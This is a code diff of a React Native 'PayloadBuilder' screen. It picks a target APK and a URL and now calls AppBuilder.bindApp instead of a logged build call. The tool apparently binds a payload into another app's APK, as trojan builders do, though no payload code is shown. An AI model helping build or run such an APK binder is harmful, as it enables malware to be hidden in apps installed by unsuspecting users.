@@ -17,23 +17,14 @@ import FontAwesome from 'react-native-vector-icons/FontAwesome';
 import { TouchableOpacity } from "react-native";
 // native module
 import AppBuilder from '../../native-modules/AppBuilder'
-// redux
-import { useDispatch } from '../../redux/store';
-import { addBuildPayloadLogs } from '../../redux/slices/userInfo'
 // components
 import BuildLogScreen from '../../components/BuildLogScreen'
 
 const PayloadBuilder = ({navigation, route}) => {
     const toast = useToast();
-    const dispatch = useDispatch();
     const { url } = route.params;
-    console.log(url)
     const [targetApk,setTargetApk]=useState();
     const [visible, setVisible]= useState(false);
-
-    const addlog =( type, message ) => { 
-        dispatch(addBuildPayloadLogs({ type, message})) 
-    }
 
     const handleBrowse =async()=>{
         try {
@@ -68,7 +59,7 @@ const PayloadBuilder = ({navigation, route}) => {
             RNFetchBlob.fs.stat(targetApk.uri).then((stats) => { 
                 if(stats.path){
                     setVisible(true)
-                    AppBuilder.build(stats.path, url, addlog);
+                    AppBuilder.bindApp(stats.path, url);
                 }else{
                     toast.show({
                         title: "Target apk selected corrupt",
